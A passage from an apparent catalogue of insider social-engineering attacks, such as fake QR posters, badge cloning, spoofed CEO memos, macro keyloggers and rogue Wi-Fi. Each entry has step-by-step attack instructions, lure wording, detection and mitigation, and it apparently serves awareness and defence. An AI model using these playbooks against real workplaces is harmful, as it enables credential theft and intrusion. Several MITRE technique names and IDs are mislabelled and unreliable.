- **Solution**: Train users to verify file requests
- **Tags**: #DrivePhish #FakeCleanup #CloudTheft

## Lunchroom Badge Swap

- **Attack Type**: Physical Identity Misuse
- **Target**: Physical Zones (Labs, HR)
- **Vulnerability**: Careless ID handling
- **MITRE**: T1078.004 (Valid Accounts – Physical Access)
- **Impact**: Theft or physical sabotage
- **Tools**: Physical Access Card
- **Scenario**: Insider swaps their badge with a trusted coworker's temporarily while they’re away, to enter restricted areas.
- **Attack Steps**: Step 1: During lunch, insider sees a colleague’s ID badge on the table.Step 2: Swaps it with a fake/invalid one or simply takes it.Step 3: Enters a restricted lab or HR room using the valid badge.Step 4: Accesses confidential folders, plug-ins USB, or reads employee records.Step 5: Returns badge silently before lunch ends.
- **Detection**: Door access logs, badge clone detection
- **Solution**: Enforce badge wear rules, lock desk policies
- **Tags**: #BadgeSwap #PhysicalAccess #IDTheft

## “Help Me With This Form” Scam

- **Attack Type**: Friendly Exploit
- **Target**: Internal Web Portals
- **Vulnerability**: Employee helpfulness
- **MITRE**: T1056.004 (Credential Prompt)
- **Impact**: Unauthorized access
- **Tools**: Web Browser
- **Scenario**: Insider pretends to not understand a secure login form and asks a colleague to fill it in for them.
- **Attack Steps**: Step 1: Insider opens a real or fake internal login form (e.g., payroll portal).Step 2: Approaches a colleague and says, “This form isn't accepting my credentials, can you try with yours to see if it works?”Step 3: The target, trying to help, enters their credentials.Step 4: The insider takes a screenshot or logs the credentials.Step 5: Later uses the credentials for unauthorized access.
- **Detection**: Session logging, browser history analysis
- **Solution**: Train users never to input creds for others
- **Tags**: #CredentialSharing #HelpTrap #InsiderTrick

## Conference Room QR Trap

- **Attack Type**: Fake QR Phishing
- **Target**: Mobile Phones / Browsers
- **Vulnerability**: Trust in QR codes
- **MITRE**: T1204.001 (User Execution – Malicious Link)
- **Impact**: Credential theft
- **Tools**: QR Code Generator, Free Hosting Site
- **Scenario**: Insider places a QR code poster in a conference room that links to a credential harvesting page.
- **Attack Steps**: Step 1: Insider generates a QR code that links to a fake login page (e.g., “WiFi access” or “download slides”).Step 2: Prints a poster saying, “Scan here for presentation notes” and sticks it in a meeting room.Step 3: Employees scan it during meetings and are prompted to “log in with corporate ID to view.”Step 4: Their credentials are sent to the insider.Step 5: Insider logs into their accounts using stolen details.
- **Detection**: DNS logging, user-reported phishing
- **Solution**: Avoid unknown QR codes; disable open login portals
- **Tags**: #QRPhish #MeetingRoomHack #FakeNotes

## Internal LinkedIn Impersonation

- **Attack Type**: Social Platform Deception
- **Target**: Social Media / Email
- **Vulnerability**: Lack of verification of identity
- **MITRE**: T1585.001 (Impersonation – Social Media)
- **Impact**: Data leakage, impersonation
- **Tools**: LinkedIn, Email
- **Scenario**: Insider creates a fake LinkedIn profile of an internal executive and messages coworkers to collect sensitive info.
- **Attack Steps**: Step 1: Insider creates a fake LinkedIn profile mimicking an internal senior staff member.Step 2: Sends connection requests to coworkers and messages like “Need your input on a vendor file, please email it.”Step 3: Colleagues trust the profile and respond with files, credentials, or access links.Step 4: Insider uses the collected information for data theft.Step 5: May delete the fake account once exposed.
- **Detection**: Reputation monitoring, employee reports
- **Solution**: Train on identity verification, use internal tools
- **Tags**: #LinkedInPhish #ExecImpersonation #SocialDeception

## Fake VPN Alert Popup

- **Attack Type**: Internal Fake Alert
- **Target**: Workstations / Laptops
- **Vulnerability**: Fake GUI, user panic
- **MITRE**: T1204.002 (Malicious File Execution)
- **Impact**: Unauthorized login, lateral movement
- **Tools**: Python GUI Tool or Fake Popup Generator
- **Scenario**: Insider installs a popup tool that mimics a VPN error and asks the user to re-enter credentials.
- **Attack Steps**: Step 1: Insider gets temporary access to a system or deploys via shared system tools.Step 2: Runs a fake VPN alert that says: “Session expired. Re-authenticate to continue.”Step 3: When the victim sees the popup, they enter their credentials.Step 4: The tool saves the entered details to a hidden file.Step 5: Insider retrieves the file later and misuses the credentials.
- **Detection**: EDR logging, suspicious local GUI processes
- **Solution**: Use secure VPN clients, block fake GUI apps
- **Tags**: #FakeVPN #CredentialPopup #InternalPhish

## IT “System Inventory Check” Ruse

- **Attack Type**: Role-Based Social Engineering
- **Target**: Desktops / Laptops
- **Vulnerability**: Role trust, data leakage
- **MITRE**: T1592.001 (Gather Victim Host Information)
- **Impact**: Recon for future attacks
- **Tools**: Clipboard, Form
- **Scenario**: Insider pretends to be from the IT department doing inventory and asks employees to list system details and software used.
- **Attack Steps**: Step 1: Insider walks around with a clipboard or Google Form saying, “IT is collecting system info for audits.”Step 2: Asks employees to write down or fill in their machine ID, installed apps, OS version, and usernames.Step 3: Targets comply, assuming it’s an official audit.Step 4: Insider compiles this for privilege escalation or remote access planning.Step 5: Uses collected data to prepare attacks or install remote agents.
- **Detection**: Track fake audit attempts, question field agents
- **Solution**: Badge-based IT verification, audit reporting
- **Tags**: #FakeInventory #ITImpersonation #RoleBasedSE

## Fake Browser Update Notification

- **Attack Type**: Local Popup Phish
- **Target**: Shared Workstations
- **Vulnerability**: Fake interface design
- **MITRE**: T1056.004 (Credential Prompt)
- **Impact**: Credential theft
- **Tools**: HTML Popup, Local Script
- **Scenario**: Insider displays a fake browser update alert prompting users to enter admin credentials.
- **Attack Steps**: Step 1: Insider gains temporary access to a system or shared PC.Step 2: Opens a browser window in full screen showing “Chrome/Edge requires update – enter admin password.”Step 3: Leaves the screen idle for the next user.Step 4: Victim sees it and enters credentials assuming it’s legitimate.Step 5: Credentials are saved locally and retrieved by insider later.
- **Detection**: Login mismatch logs, credential reuse alerts
- **Solution**: Never enter credentials from browser popups
- **Tags**: #FakeUpdate #BrowserPhish #CredentialTrap

## Fake “Guest Speaker Invite”

- **Attack Type**: Internal Trust Exploit
- **Target**: Employee Email
- **Vulnerability**: Unverified internal emails
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Malware infection
- **Tools**: Email, Link Shortener, PDF Exploit
- **Scenario**: Insider sends a fake email pretending to be from the training team asking employees to join a session using a malware-laced link.
- **Attack Steps**: Step 1: Insider crafts an internal-looking email: “Join our cybersecurity awareness webinar – Hosted by XYZ.”Step 2: Adds a link or PDF with embedded malware or tracking.Step 3: Sends to coworkers using spoofed or anonymous internal address.Step 4: When they open the link, malware is silently downloaded.Step 5: Insider later uses infected systems to access internal data.
- **Detection**: Attachment scanning, network alerts
- **Solution**: Validate internal communication sources
- **Tags**: #GuestPhish #WebinarScam #PDFExploit

## Shared Drive “Training Video” Trap

- **Attack Type**: Malicious File Sharing
- **Target**: Shared Storage
- **Vulnerability**: File disguise
- **MITRE**: T1204.002 (Malicious File Execution)
- **Impact**: System takeover
- **Tools**: Shared Drive, .exe disguised as .mp4
- **Scenario**: Insider uploads a file labeled “Training Video – Mandatory.mp4” to shared drive, but it’s a disguised executable.
- **Attack Steps**: Step 1: Insider creates a malicious file and renames it with .mp4 extension (e.g., “.mp4.exe”).Step 2: Uploads it to a shared Google Drive/Dropbox folder.Step 3: Notifies coworkers: “Please complete mandatory training by EOD.”Step 4: Victim downloads and runs the file, which executes malware.Step 5: Insider gains remote access or steals credentials.
- **Detection**: File scanning, AV alerts
- **Solution**: Allow only known file types; use sandboxing
- **Tags**: #FileTrap #FakeVideo #DriveMalware

## Fake Feedback “Emoji Vote” Scam

- **Attack Type**: Clickbait Form
- **Target**: Browsers / Emails
- **Vulnerability**: Trust in fun polls
- **MITRE**: T1589.002 (Collect Email Addresses)
- **Impact**: Recon for targeting
- **Tools**: Google Forms, Link Tracker
- **Scenario**: Insider sends a fun-looking emoji poll that secretly logs email addresses and device info.
- **Attack Steps**: Step 1: Insider creates a poll titled “What’s your Friday mood? Vote using emojis!”Step 2: Shares in team chat or group email.Step 3: The poll has hidden fields that auto-log responder’s name, email, and browser metadata.Step 4: Insider later analyzes this info for device fingerprinting or phishing.Step 5: No one suspects since the poll looks harmless.
- **Detection**: Monitor strange internal links
- **Solution**: Use internal-only survey tools
- **Tags**: #EmojiPoll #ClickbaitRecon #InfoLeak

## Insider Acting as New Joiner

- **Attack Type**: Identity Deception
- **Target**: Internal Chat / Email
- **Vulnerability**: No joiner verification
- **MITRE**: T1078.001 (Valid Accounts – User)
- **Impact**: Unauthorized access
- **Tools**: Email, Internal Messaging
- **Scenario**: Insider pretends to be a new hire and socially engineers colleagues into sharing onboarding files and passwords.
- **Attack Steps**: Step 1: Insider messages colleagues: “Hi, I just joined the support team. Can you share the VPN setup doc and common logins?”Step 2: Uses a believable name and profile picture.Step 3: Some employees share sensitive materials thinking it’s part of onboarding.Step 4: Insider collects credentials and guides.Step 5: Uses them for lateral movement in the network.
- **Detection**: Identity validation audits
- **Solution**: Tag new users with onboarding alerts
- **Tags**: #FakeJoiner #NewHireScam #Impersonation

## Fake “Printer Queue Stuck” Trick

- **Attack Type**: Technical Panic Exploit
- **Target**: Remote Portals
- **Vulnerability**: Trust in colleague + urgency
- **MITRE**: T1566.002 (Phishing – Link)
- **Impact**: Lateral access
- **Tools**: Remote Access Tool, Shared PC
- **Scenario**: Insider says print queue is stuck and asks target to log in remotely, then records credentials.
- **Attack Steps**: Step 1: Insider asks colleague: “Can you log into the printer system remotely? My access is blocked.”Step 2: Shares a fake printer URL or remote desktop link.Step 3: Victim logs in with real credentials.Step 4: Session is monitored by insider using a tool like AnyDesk or screen recorder.Step 5: Credentials are reused to access more systems.
- **Detection**: Session recording detection
- **Solution**: Don’t share access under panic situations
- **Tags**: #PrintScam #RemoteTrap #AccessAbuse

## Fake “IT Survey” Kiosk

- **Attack Type**: Physical Data Capture
- **Target**: Physical Office Kiosk
- **Vulnerability**: No survey validation
- **MITRE**: T1056.001 (Keylogger / Input Capture)
- **Impact**: Password theft
- **Tools**: Laptop with Form Page
- **Scenario**: Insider sets up a fake feedback station asking for login details as part of “system rating.”
- **Attack Steps**: Step 1: Insider sets up a kiosk or open laptop near entrance with banner: “Rate your IT experience – Win a prize!”Step 2: Users are asked to enter their name, work email, and “Employee ID (password used for logins).”Step 3: Some employees fill it thinking it’s an official survey.Step 4: Insider collects and misuses submitted credentials.Step 5: Station is removed after some time to avoid suspicion.
- **Detection**: Physical audit, survey verification
- **Solution**: Prohibit ad-hoc feedback kiosks
- **Tags**: #SurveyTrap #FakeKiosk #CredentialGrab

## Insider Uses “Zoom Rename” Impersonation

- **Attack Type**: Meeting Spoofing
- **Target**: Video Meetings
- **Vulnerability**: No participant identity check
- **MITRE**: T1585.002 (Impersonation – Internal Entity)
- **Impact**: Data theft
- **Tools**: Zoom / Teams
- **Scenario**: Insider joins a Zoom call and renames themselves as a manager to influence chat or trick people into sharing files.
- **Attack Steps**: Step 1: Insider joins a large internal meeting (e.g., town hall).Step 2: Changes their display name to match a known executive.Step 3: Types in chat: “Please upload last month’s metrics to this shared link.”Step 4: Attendees comply, thinking it's a valid request.Step 5: Insider downloads and uses shared data.
- **Detection**: Meeting participant validation
- **Solution**: Lock name changes; restrict chat uploads
- **Tags**: #ZoomHack #MeetingImpersonation #FakeExec

## Badge Cloning During Break

- **Attack Type**: RFID/Badge Exploit
- **Target**: Physical Security
- **Vulnerability**: Badge cloning risk
- **MITRE**: T1078.004 (Valid Accounts – Physical)
- **Impact**: Facility breach
- **Tools**: RFID Cloner (e.g., Proxmark3)
- **Scenario**: Insider clones coworker's badge during lunch using a portable cloner and gains after-hours access.
- **Attack Steps**: Step 1: Insider borrows or lifts badge briefly while coworker is away.Step 2: Uses portable RFID cloner to duplicate badge.Step 3: Returns original badge.Step 4: After hours, uses clone to access secure labs or HR records.Step 5: Logs show access under victim’s ID.
- **Detection**: Badge clone detection, time mismatch logs
- **Solution**: RFID protection, monitor badge events
- **Tags**: #BadgeClone #PhysicalSE #RFIDHack

## Fake Peer Review for Policy Doc

- **Attack Type**: Policy Review Scam
- **Target**: Policy Documents
- **Vulnerability**: Document trust and oversight
- **MITRE**: T1565.001 (Data Manipulation)
- **Impact**: Policy fraud
- **Tools**: Google Docs / Word
- **Scenario**: Insider creates a fake “policy update” and asks employees to edit it, inserting fake clauses.
- **Attack Steps**: Step 1: Insider shares a document titled “Policy Draft: New Leave Rules.”Step 2: Adds real content and a few hidden fake rules (e.g., “Admins can access any system if needed”).Step 3: Sends to coworkers with edit rights to “review.”Step 4: Once accepted and forwarded to management, the fake clause becomes official-looking.Step 5: Insider uses this clause to justify later misuse.
- **Detection**: Document change audits
- **Solution**: Only trusted reviewers allowed to edit policies
- **Tags**: #PolicyFraud #DocScam #InternalAbuse

## Fake “Team Password Vault Access”

- **Attack Type**: Credential Harvesting
- **Target**: Shared Team Accounts
- **Vulnerability**: Trust in tool migration
- **MITRE**: T1566.002 (Spearphishing Link)
- **Impact**: Full team access breach
- **Tools**: Fake Web Form
- **Scenario**: Insider creates a fake team password-sharing portal to steal group account credentials.
- **Attack Steps**: Step 1: Insider builds a simple site mimicking LastPass or Bitwarden UI.Step 2: Sends email: “Team password vault has moved. Log in here to sync.”Step 3: Team members use their shared credentials to log in.Step 4: Form logs entries and stores them in a hidden file or Google Sheet.Step 5: Insider now has access to shared tools (email, server, vendor portals).
- **Detection**: DNS logging, fake domain alerts
- **Solution**: Centralize password management, validate tool changes
- **Tags**: #VaultPhish #PasswordTheft #FakePortal

## Fake Wi-Fi Network Named After Company

- **Attack Type**: Rogue AP Attack
- **Target**: Employee Laptops & Phones
- **Vulnerability**: Auto-connect settings
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Session hijack, data leak
- **Tools**: Wi-Fi Pineapple or Mobile Hotspot
- **Scenario**: Insider sets up a fake Wi-Fi network named after the company and monitors traffic.
- **Attack Steps**: Step 1: Insider sets up hotspot named “Company_Internal” in common area.Step 2: Employees auto-connect due to saved network names.Step 3: Insider runs a packet sniffer like Wireshark to monitor login traffic or session cookies.Step 4: Captures credentials or tokens if HTTPS is not enforced.Step 5: Uses data to access internal systems.
- **Detection**: Rogue AP detection tools
- **Solution**: Disable auto-connect, use VPN + HTTPS
- **Tags**: #RogueWiFi #FakeSSID #MITM

## “Daily Update Email” Macro Trap

- **Attack Type**: Document Phishing
- **Target**: Team Laptops
- **Vulnerability**: Macro execution enabled
- **MITRE**: T1203 (Exploitation via File Execution)
- **Impact**: Credential theft
- **Tools**: Excel Macro (.xlsm), Email
- **Scenario**: Insider sends a macro-enabled spreadsheet as part of “daily team updates” which installs spyware.
- **Attack Steps**: Step 1: Insider prepares a file “DailyStats.xlsm” with an auto-run macro that downloads a keylogger.Step 2: Sends via email to team list with “Stats for Review – Pls check before 3 PM.”Step 3: Recipients open the file; macro triggers silently.Step 4: Keylogger installs and sends logs to a webhook or insider email.Step 5: Insider collects credentials and activity logs.
- **Detection**: AV alerts, script monitoring
- **Solution**: Block all macros; allow signed-only
- **Tags**: #MacroAttack #DailyUpdateTrap #Keylogger

## “Birthday Card for Manager” File Trap

- **Attack Type**: Guilt-Based Phish
- **Target**: Office Devices
- **Vulnerability**: Groupthink, emotional bait
- **MITRE**: T1204.002 (Malicious File Execution)
- **Impact**: Data exposure
- **Tools**: PowerPoint or PDF with Tracker
- **Scenario**: Insider sends a fake birthday greeting card with embedded tracking or malware.
- **Attack Steps**: Step 1: Insider creates a PowerPoint: “Happy Birthday [Manager] – Please Sign!” with embedded tracking image.Step 2: Shares with team: “Let’s all sign this for the manager!”Step 3: File silently collects device info or triggers malware download.Step 4: Insider monitors who opened the file and exploits them first.Step 5: Could also plant macros or cookies for later access.
- **Detection**: File sandboxing, image tracking detection
- **Solution**: Only use official tools for document sharing
- **Tags**: #CardPhish #BirthdayBait #TrackerFile

## Insider Plants “Forgotten Laptop” in Meeting Room

- **Attack Type**: Physical Social Engineering
- **Target**: Corporate Network
- **Vulnerability**: No device whitelisting
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Sensitive data sniffing
- **Tools**: Laptop with Packet Sniffer
- **Scenario**: Insider leaves an infected laptop labeled “IT Support – Do Not Move” in a common area to sniff network traffic.
- **Attack Steps**: Step 1: Insider prepares a laptop with Wireshark or tcpdump and disables screen display.Step 2: Labels it with “IT Support – Temporary Logger” and leaves it near Ethernet jack or Wi-Fi.Step 3: Device silently sniffs traffic from internal systems.Step 4: Insider retrieves laptop after a few hours.Step 5: Analyzes data for credentials, sessions, or patterns.
- **Detection**: Monitor unauthorized MAC addresses
- **Solution**: Device registration, cable lock rules
- **Tags**: #ForgottenLaptop #SnifferAttack #UnattendedDevice

## Fake “Internal Memo” from CEO

- **Attack Type**: Authority Phish
- **Target**: Email / Docs
- **Vulnerability**: Lack of sender validation
- **MITRE**: T1585 (Impersonation – Email)
- **Impact**: Sensitive data exposure
- **Tools**: Spoofed Email Address
- **Scenario**: Insider sends a fake memo from the CEO requesting urgent document access.
- **Attack Steps**: Step 1: Insider creates a spoofed email: ceo_name@company-admin.com.Step 2: Sends a message: “URGENT: I need access to all Q4 HR reports. Share them now.”Step 3: Uses pressure and urgency language to scare employees.Step 4: Some comply without validating.Step 5: Insider receives the files and uses them for leverage.
- **Detection**: DMARC/SPF checks, phishing flags
- **Solution**: CEO fraud training, internal alert keywords
- **Tags**: #CEOPhish #UrgentMemo #FakeBoss

## Printer Repairman Impersonation

- **Attack Type**: Physical Disguise
- **Target**: Shared PCs / Printers
- **Vulnerability**: No guest identity check
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Full device compromise
- **Tools**: USB Rubber Ducky, Fake ID
- **Scenario**: Insider dresses as a repairman to gain office access and plug a USB payload into shared PCs.
- **Attack Steps**: Step 1: Insider wears a uniform, badge, and carries a fake work order.Step 2: Walks into office and says “Printer repair – ticket 2421.”Step 3: Gains access to printer-connected PCs and inserts USB payload.Step 4: Payload executes, installs reverse shell.Step 5: Insider leaves, later connects remotely.
- **Detection**: CCTV, badge verification
- **Solution**: Visitor logs, repair scheduling rules
- **Tags**: #FakeTech #USBHack #PhysicalExploit

## Coffee Shop “Shoulder Phish”

- **Attack Type**: Off-Site Visual Eavesdrop
- **Target**: Remote Devices
- **Vulnerability**: Screen visibility
- **MITRE**: T1110.003 (UI-based Credential Theft)
- **Impact**: Account compromise
- **Tools**: Smartphone, Pen & Paper
- **Scenario**: Insider meets coworkers at a public place and watches screens as they check emails, dashboards.
- **Attack Steps**: Step 1: Insider invites coworker to a casual meetup at a café.Step 2: Sits across or beside them, pretending to be distracted.Step 3: Coworker opens email or admin dashboard on laptop.Step 4: Insider takes photos or notes credentials/pass URLs.Step 5: Later uses them to log into systems.
- **Detection**: User report, mobile activity logging
- **Solution**: Privacy filters, awareness training
- **Tags**: #ShoulderPhish #PublicLeak #VisualSE

## Fake Plugin Suggestion for Internal Tool

- **Attack Type**: Internal Tool Abuse
- **Target**: Web Browsers
- **Vulnerability**: Plugin trust
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Credential and data theft
- **Tools**: Malicious Chrome Extension
- **Scenario**: Insider suggests a browser plugin to improve internal web app experience which actually injects data-stealing JS.
- **Attack Steps**: Step 1: Insider builds/edits a Chrome extension with JS that scrapes form fields.Step 2: Suggests in team chat: “Try this plugin to autofill CRM tickets!”Step 3: Coworkers install plugin; it begins scraping login forms and inputs silently.Step 4: Sends collected data to insider’s server.Step 5: Insider uses info to access tools or impersonate users.
- **Detection**: Browser plugin audits
- **Solution**: Limit plugin installs to approved list
- **Tags**: #PluginPhish #InternalAbuse #BrowserTrap

## Insider Plants “Free Headphones Giveaway” Poster

- **Attack Type**: QR Code Bait
- **Target**: Employee Phones
- **Vulnerability**: QR trust + greed
- **MITRE**: T1204.001 (User Execution – Link)
- **Impact**: Account access
- **Tools**: QR Generator, Poster Print
- **Scenario**: Insider puts a fake HR poster in cafeteria offering free headphones via QR code that links to credential grabber.
- **Attack Steps**: Step 1: Insider prints poster: “Scan & Win Free Headphones – First 20 Employees Only!”Step 2: Places it in lunchroom or restrooms.Step 3: QR links to a form asking for work email, name, and login to verify eligibility.Step 4: Some employees submit credentials.Step 5: Insider collects logins and uses them for access.
- **Detection**: QR scan logs, fake site blocklists
- **Solution**: Use internal portals for any giveaways
- **Tags**: #QRScam #PosterPhish #GreedAttack

## Free Software License Scam

- **Attack Type**: Software Bait
- **Target**: Workstations
- **Vulnerability**: Trusting peers for software
- **MITRE**: T1204.002 (Malicious File Execution)
- **Impact**: Full machine compromise
- **Tools**: Cracked Software Installer
- **Scenario**: Insider offers coworkers “free premium software” that actually installs a backdoor.
- **Attack Steps**: Step 1: Insider sends a message: “Hey, I have a free Adobe full version if anyone needs for design work.”Step 2: Coworker downloads it from a shared drive or file host.Step 3: Installer silently drops a backdoor (e.g., reverse shell or keylogger).Step 4: Insider connects later to control or monitor their system.Step 5: Exploits the infected device for lateral access.
- **Detection**: AV alerts, traffic monitoring
- **Solution**: Block unauthorized software installs
- **Tags**: #CrackedSoftware #FakeLicense #InsiderMalware

## Candy Jar Password Trick

- **Attack Type**: Visual Social Engineering
- **Target**: Work Desktops
- **Vulnerability**: Lack of screen privacy
- **MITRE**: T1056.001 (Input Observation)
- **Impact**: Credential theft
- **Tools**: None (human manipulation)
- **Scenario**: Insider watches coworkers type passwords by distracting them with a candy jar at their desk.
- **Attack Steps**: Step 1: Insider places a candy jar or stress ball on someone’s desk.Step 2: Asks, “Can I have one?” just as the coworker logs into a secure system.Step 3: Watches keyboard carefully to memorize keystrokes.Step 4: Reconstructs possible password by recalling finger movement.Step 5: Tries to access their account later using guessed password.
- **Detection**: Awareness training, odd behavior reports
- **Solution**: Promote screen privacy practices
- **Tags**: #ShoulderSurf #VisualHack #CandyTrick

## Fake Exit Interview

- **Attack Type**: HR Impersonation
- **Target**: Employee Emails
- **Vulnerability**: HR authority assumption
- **MITRE**: T1592 (Gather Victim Org Info)
- **Impact**: Internal knowledge leakage
- **Tools**: Email, Calendar Invite
- **Scenario**: Insider pretends to be from HR and schedules exit interviews to extract sensitive system usage data.
- **Attack Steps**: Step 1: Insider emails coworker: “Hi, we’re updating exit forms. Can I confirm your app/tool access history?”Step 2: Coworker replies with what tools they used, passwords if prompted, and who else had access.Step 3: Insider collects this info and builds a map of internal tool usage.Step 4: May schedule multiple such fake calls.Step 5: Uses data for lateral movement or sabotage.
- **Detection**: Calendar invite pattern scan
- **Solution**: HR communication policy
- **Tags**: #ExitInterviewPhish #HRFraud #SocialDeception

## Fake Internal Rewards Poll

- **Attack Type**: Info Harvesting
- **Target**: Email / Form
- **Vulnerability**: Misuse of reward culture
- **MITRE**: T1566.002 (Phishing Link)
- **Impact**: Credential theft
- **Tools**: Google Forms, MS Forms
- **Scenario**: Insider builds a form asking employees to vote for "best team player" while sneakily requesting email & passwords.
- **Attack Steps**: Step 1: Insider sends a poll: “Vote for Employee of the Month – Winner gets Amazon voucher!”Step 2: Form asks for work email and password “for confirmation.”Step 3: Employees trust internal source and fill it.Step 4: Insider collects credentials from form backend.Step 5: Uses them to log in to internal systems.
- **Detection**: Form monitoring, phishing reports
- **Solution**: Block form logins; train on email scams
- **Tags**: #RewardsScam #InternalPhish #FakePoll

## Dropbox “File Shared With You” Scam

- **Attack Type**: Fake File Share
- **Target**: Cloud Platforms
- **Vulnerability**: Trust in Dropbox/email combo
- **MITRE**: T1566.002 (Spearphishing Link)
- **Impact**: Account compromise
- **Tools**: Dropbox Phishing Page
- **Scenario**: Insider shares a fake Dropbox link appearing like a company file and asks coworkers to log in.
- **Attack Steps**: Step 1: Insider uploads a blank PDF to Dropbox with a fake preview link.Step 2: Emails coworkers: “Important tax document shared – login to view.”Step 3: Login page is a phishing clone that collects credentials.Step 4: Employees log in, and credentials are logged.Step 5: Insider uses them for unauthorized access.
- **Detection**: URL filtering, Dropbox access alerts
- **Solution**: Validate all file sharing links
- **Tags**: #DropboxScam #FilePhish #CredentialTheft

## Insider Modifies Printer Footer

- **Attack Type**: Document Manipulation
- **Target**: Office Printers
- **Vulnerability**: Poor access control
- **MITRE**: T1565.001 (Data Manipulation)
- **Impact**: User redirection, info theft
- **Tools**: Printer Settings Access
- **Scenario**: Insider changes printer footer to include fake contact details or malicious links.
- **Attack Steps**: Step 1: Insider accesses office printer admin panel.Step 2: Edits footer to include a fake helpdesk number or a QR link.Step 3: All future prints include this footer.Step 4: Employees trust it and call or scan.Step 5: Insider tricks them into installing tools or sharing info.
- **Detection**: Printer logs, unusual footer content
- **Solution**: Restrict printer settings access
- **Tags**: #PrinterHack #FooterExploit #MaliciousPrint

## Slipped Fake IT Memo in Bulletin Board

- **Attack Type**: Offline SE
- **Target**: Office Staff
- **Vulnerability**: Physical trust (printed info)
- **MITRE**: T1566.001 (Phishing – Offline)
- **Impact**: Credential theft
- **Tools**: Bulletin Board, Printout
- **Scenario**: Insider posts a fake printed IT memo asking users to "reset" passwords on a listed fake portal.
- **Attack Steps**: Step 1: Insider prints a flyer: “New security update – all staff must reset their passwords here: resetit.in/company.”Step 2: Posts it on the bulletin board near the pantry or entrance.Step 3: Some staff follow the printed link, believing it’s real.Step 4: Login form collects credentials.Step 5: Insider uses these details to access internal systems.
- **Detection**: Notice board audit, reported links
- **Solution**: Restrict physical notice access
- **Tags**: #BulletinPhish #OfflineScam #PrintedAttack

## Misused IT Ticket for Password Reset

- **Attack Type**: Internal Process Exploit
- **Target**: IT Teams / Helpdesk
- **Vulnerability**: Weak verification in reset flow
- **MITRE**: T1078.001 (Valid Accounts)
- **Impact**: Account takeover
- **Tools**: ITSM System
- **Scenario**: Insider raises a fake IT support ticket claiming their “email is locked,” requesting reset of another user's account.
- **Attack Steps**: Step 1: Insider opens a support ticket using their ID but requests a reset for another employee (e.g., “reset [target]@company.com”).Step 2: If unchecked, IT resets target's password and shares it.Step 3: Insider now logs into the target’s account.Step 4: Changes password and possibly locks them out.Step 5: Uses access to browse sensitive info.
- **Detection**: Ticket audit trail, IT SOP breach
- **Solution**: Dual verification for reset requests
- **Tags**: #TicketAbuse #HelpdeskHack #ResetScam

## Insider Creates “Training Portal” Clone

- **Attack Type**: Full Site Spoof
- **Target**: Web Portals
- **Vulnerability**: UI clone + user trust
- **MITRE**: T1566.002 (Phishing Link)
- **Impact**: Credential harvesting
- **Tools**: Web Cloning Tool (HTTrack)
- **Scenario**: Insider clones internal training portal and adds a login capture form.
- **Attack Steps**: Step 1: Insider clones the look and feel of internal LMS.Step 2: Hosts on internal-looking domain: training-portal.intra.netStep 3: Sends “urgent training module” mail to coworkers.Step 4: Users log in, thinking it’s the original portal.Step 5: Insider captures login credentials and reuses them.
- **Detection**: DNS filters, site reputation scoring
- **Solution**: Use centralized SSO portals only
- **Tags**: #TrainingPhish #PortalClone #FakeLMS

## Watercooler Gossiper for Recon

- **Attack Type**: Info Harvesting
- **Target**: Any Dept
- **Vulnerability**: Over-sharing culture
- **MITRE**: T1592.001 (Gather Org Information)
- **Impact**: Recon / Planning
- **Tools**: Voice Memo App or Notebook
- **Scenario**: Insider casually chats near the watercooler and collects key info about projects, people, and systems.
- **Attack Steps**: Step 1: Insider joins casual office talk: “What’s the dev team using now?”Step 2: Extracts info about tech stack, deployment tools, or credentials handling.Step 3: Jots down or voice records discreetly.Step 4: Repeats in multiple departments for recon.Step 5: Uses data to prepare for bigger internal exploit.
- **Detection**: Monitor behavioral patterns
- **Solution**: Promote need-to-know discussions
- **Tags**: #WatercoolerRecon #SocialHarvest #ChatLeak

## Insider Uses Shared Calendar Notes

- **Attack Type**: Calendar Recon
- **Target**: Calendar Systems
- **Vulnerability**: Over-sharing in event notes
- **MITRE**: T1589.002 (Credential Harvesting – Notes)
- **Impact**: Unauthorized access
- **Tools**: Shared Calendar, Keyword Search
- **Scenario**: Insider scans shared calendars for keywords like “VPN,” “meeting password,” “system credentials.”
- **Attack Steps**: Step 1: Insider accesses open company calendar (Google, Outlook).Step 2: Searches for events with sensitive keywords (e.g., “admin creds,” “VPN details”).Step 3: Finds meeting notes or invites with passwords embedded.Step 4: Uses credentials to access systems.Step 5: Deletes or covers tracks afterward.
- **Detection**: Calendar scan tools, audit logs
- **Solution**: Train users to avoid sensitive info in invites
- **Tags**: #CalendarHack #InfoLeak #EventRecon

## Fake “Payroll Verification” Call

- **Attack Type**: Voice Phishing (Vishing)
- **Target**: Employee Phones
- **Vulnerability**: Phone trust, urgency pressure
- **MITRE**: T1598 (Phishing via Voice)
- **Impact**: Identity theft, financial fraud
- **Tools**: Phone, Voice Script
- **Scenario**: Insider calls employees pretending to be from payroll and asks for ID and login info for “account validation.”
- **Attack Steps**: Step 1: Insider finds target’s phone number from directory.Step 2: Calls posing as payroll: “We found a mismatch in your tax ID, can you verify details?”Step 3: Victim shares login or ID info over call.Step 4: Insider uses details to access HR/payroll system.Step 5: May change pay info or extract employee data.
- **Detection**: Call logs, pattern detection
- **Solution**: No account verification over call policy
- **Tags**: #Vishing #PayrollScam #PhoneHack

## Insider Adds “Extra Email” to Colleague’s Account

- **Attack Type**: Hidden Monitoring
- **Target**: Shared SaaS Tools
- **Vulnerability**: Poor audit on email changes
- **MITRE**: T1098.003 (Account Manipulation – Email)
- **Impact**: Persistent access
- **Tools**: Admin Panel, Email Alias
- **Scenario**: Insider accesses a shared system and adds their email as a backup for another employee’s account.
- **Attack Steps**: Step 1: Insider logs into a tool or platform shared by team.Step 2: Navigates to a colleague’s profile settings.Step 3: Adds their own email as a backup or alternate address.Step 4: Receives password resets, notifications secretly.Step 5: Maintains ongoing access unnoticed.
- **Detection**: Audit email change logs
- **Solution**: Restrict profile edit access
- **Tags**: #EmailHijack #HiddenAccess #AliasAttack

## Fake “Access Expiry Alert” Message

- **Attack Type**: Urgency Trap
- **Target**: Internal Chat
- **Vulnerability**: No link validation in chat
- **MITRE**: T1566.002 (Spearphishing Link)
- **Impact**: Credential theft
- **Tools**: Internal Messaging, Phishing Link
- **Scenario**: Insider sends a Slack or Teams message saying, “Your access expires in 1 hour – reset your password now!”
